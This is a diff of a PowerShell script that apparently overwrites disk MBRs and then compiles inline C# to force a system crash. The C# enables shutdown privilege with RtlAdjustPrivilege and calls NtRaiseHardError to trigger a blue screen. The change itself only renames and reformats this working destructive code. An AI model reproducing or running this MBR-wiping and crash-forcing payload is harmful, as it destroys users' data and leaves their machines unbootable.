@@ -50,26 +50,31 @@ foreach ($drive in $drives) {
 # Only execute Add-Type if at least one MBR was modified
 if ($mbrOverwritten) {
 
-    $src = @"
+$src = @"
 using System;
 using System.Runtime.InteropServices;
 
-public static class CS {
-	[DllImport("ntdll")]
-	public static extern uint RtlAdjustPrivilege(int p, bool e, bool t, out bool pv);
+public static class Program {
 
-	[DllImport("ntdll")]
-	public static extern uint NtRaiseHardError(uint s, uint n, uint m, IntPtr p, uint o, out uint r);
+    [DllImport("ntdll")]
+    private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
 
-	public static void Kill() {
-		bool b; uint u;
-		RtlAdjustPrivilege(19, true, false, out b);
-		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out u);
-	}
+    [DllImport("ntdll")]
+    private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+    public static void Main() {
+
+        bool PreviousValue; 
+	uint Response;
+        RtlAdjustPrivilege(19, true, false, out PreviousValue);
+        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out Response);
+
+    }
 }
 "@
 
-Add-Type -TypeDefinition $src
+Add-Type $src
 
-[CS]::Kill()
+[Program]::Main()
 
+}
